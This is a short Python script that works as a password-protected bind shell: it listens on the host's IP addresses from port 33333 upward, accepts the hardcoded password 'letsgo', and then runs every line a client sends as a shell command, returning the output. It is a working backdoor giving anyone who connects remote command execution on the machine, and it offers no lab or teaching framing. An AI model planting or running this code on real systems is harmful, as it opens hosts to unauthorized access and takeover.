import threading
import subprocess
import socket
import logging

logging.basicConfig(level=logging.WARNING)

ip=subprocess.check_output(['hostname', '--all-ip-addresses'])
ip=ip.decode().strip()
port=33333
logging.info("starting at ip " + str(ip))

server = socket.socket() 

while True:
    try:
        logging.info("try port " + str(port))
        server.bind((ip, port))
        break
    except Exception as e:
        print(str(e))
        port += 1

logging.info(f"listen on {ip}:{port}")
server.listen(20)

def shell(client_socket):
    data = client_socket.recv(1024).decode().strip()
    if data != "letsgo":
        logging.info("wrong password..." + data)
        return
    client_socket.send(b"#> ")
    while True:
        data = client_socket.recv(1024).decode()
        data=data.strip()
        if data=="exit":
            break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client_socket.sendall(output)
        client_socket.send(b"#> ")
    client_socket.shutdown(socket.SHUT_RDWR)
    client_socket.close()

while True:
    c, addr = server.accept()     # Establish connection with client.
    logging.info(addr, "has connected")
    t=threading.Thread(target=shell,args=(c,))
    t.start()
